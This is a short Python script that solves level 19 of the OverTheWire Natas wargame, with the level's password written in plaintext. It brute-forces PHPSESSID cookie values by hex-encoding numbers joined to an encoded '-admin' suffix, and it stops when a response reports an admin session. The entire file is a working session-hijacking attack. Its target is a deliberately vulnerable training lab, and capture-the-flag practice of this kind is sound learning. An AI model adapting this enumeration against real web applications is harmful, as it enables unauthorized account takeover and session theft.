import requests
import tqdm

url = 'http://natas19.natas.labs.overthewire.org/'
username = 'natas19'
password = '8LMJEhKFbMKIL2mxQKjv0aEDdk7zpT0s'

auth = (username, password)


def main():
    params = {'username': "admin", "password": "admin", "debug": 1}

    for i in tqdm.tqdm(range(0,999)):
        rand_string = str(i)
        rand_string = [hex(ord(i)).replace("0x", "") for i in rand_string]
        rand_string = ''.join(rand_string)
        cookies = {'PHPSESSID': rand_string + "2d" + "61646d696e" }
        response = requests.get(url, params=params, auth=auth, cookies=cookies)
        if response.status_code == 200:
            if "You are an admin" in response.text:
                print(f"admin session id is {i}")
                print(response.text) 
                exit(0)
            pass
        elif response.status_code != 200:
            print(f"status: {response.status_code}")
            raise RuntimeError("Error in query.")


if __name__ == "__main__":
    main()
